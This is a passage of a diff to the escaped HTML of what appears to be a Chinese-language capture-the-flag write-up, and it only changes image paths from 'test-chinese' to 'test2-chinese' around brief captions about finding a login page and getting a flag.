+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test2-chinese/index.zh-cn.assets/1730093601145-d19f15c5-fdc2-401e-87dd-9079e2f6cdde.png&#34;
 	width=&#34;607&#34;
 	height=&#34;177&#34;
-	srcset=&#34;https://dxlaboratory.github.io/p/test-chinese/index.zh-cn.assets/1730093601145-d19f15c5-fdc2-401e-87dd-9079e2f6cdde_hu9665311826050100085.png 480w, https://dxlaboratory.github.io/p/test-chinese/index.zh-cn.assets/1730093601145-d19f15c5-fdc2-401e-87dd-9079e2f6cdde_hu2292211963539219201.png 1024w&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test2-chinese/index.zh-cn.assets/1730093601145-d19f15c5-fdc2-401e-87dd-9079e2f6cdde_hu9665311826050100085.png 480w, https://dxlaboratory.github.io/p/test2-chinese/index.zh-cn.assets/1730093601145-d19f15c5-fdc2-401e-87dd-9079e2f6cdde_hu2292211963539219201.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -179,10 +1059,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;扫描到登录界面&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test-chinese/index.zh-cn.assets/1730093661658-c232badc-2e2a-4823-9a46-691f1b1855e5.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test2-chinese/index.zh-cn.assets/1730093661658-c232badc-2e2a-4823-9a46-691f1b1855e5.png&#34;
 	width=&#34;532&#34;
 	height=&#34;480&#34;
-	srcset=&#34;https://dxlaboratory.github.io/p/test-chinese/index.zh-cn.assets/1730093661658-c232badc-2e2a-4823-9a46-691f1b1855e5_hu15474374288307030387.png 480w, https://dxlaboratory.github.io/p/test-chinese/index.zh-cn.assets/1730093661658-c232badc-2e2a-4823-9a46-691f1b1855e5_hu2709866776154881619.png 1024w&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test2-chinese/index.zh-cn.assets/1730093661658-c232badc-2e2a-4823-9a46-691f1b1855e5_hu15474374288307030387.png 480w, https://dxlaboratory.github.io/p/test2-chinese/index.zh-cn.assets/1730093661658-c232badc-2e2a-4823-9a46-691f1b1855e5_hu2709866776154881619.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -257,10 +1137,10 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;到处点一点拿到flag2&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test-chinese/index.zh-cn.assets/1730094635282-25fd07ef-c4d2-4f92-aca5-ad8b7e156fa4.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test2-chinese/index.zh-cn.assets/1730094635282-25fd07ef-c4d2-4f92-aca5-ad8b7e156fa4.png&#34;
 	width=&#34;852&#34;
 	height=&#34;336&#34;
-	srcset=&#34;https://dxlaboratory.github.io/p/test-chinese/index.zh-cn.assets/1730094635282-25fd07ef-c4d2-4f92-aca5-ad8b7e156fa4_hu18027516157568359795.png 480w, https://dxlaboratory.github.io/p/test-chinese/index.zh-cn.assets/1730094635282-25fd07ef-c4d2-4f92-aca5-ad8b7e156fa4_hu3052568483070104277.png 1024w&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test2-chinese/index.zh-cn.assets/1730094635282-25fd07ef-c4d2-4f92-aca5-ad8b7e156fa4_hu18027516157568359795.png 480w, https://dxlaboratory.github.io/p/test2-chinese/index.zh-cn.assets/1730094635282-25fd07ef-c4d2-4f92-aca5-ad8b7e156fa4_hu3052568483070104277.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -283,10 +1163,10 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;进行连接登录&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test-chinese/index.zh-cn.assets/1730097632723-ab47096f-b49b-493e-9723-8c80094145c6.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test2-chinese/index.zh-cn.assets/1730097632723-ab47096f-b49b-493e-9723-8c80094145c6.png&#34;
 	width=&#34;720&#34;
 	height=&#34;190&#34;
-	srcset=&#34;https://dxlaboratory.github.io/p/test-chinese/index.zh-cn.assets/1730097632723-ab47096f-b49b-493e-9723-8c80094145c6_hu7677809838715028512.png 480w, https://dxlaboratory.github.io/p/test-chinese/index.zh-cn.assets/1730097632723-ab47096f-b49b-493e-9723-8c80094145c6_hu4811569570229345252.png 1024w&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test2-chinese/index.zh-cn.assets/1730097632723-ab47096f-b49b-493e-9723-8c80094145c6_hu7677809838715028512.png 480w, https://dxlaboratory.github.io/p/test2-chinese/index.zh-cn.assets/1730097632723-ab47096f-b49b-493e-9723-8c80094145c6_hu4811569570229345252.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
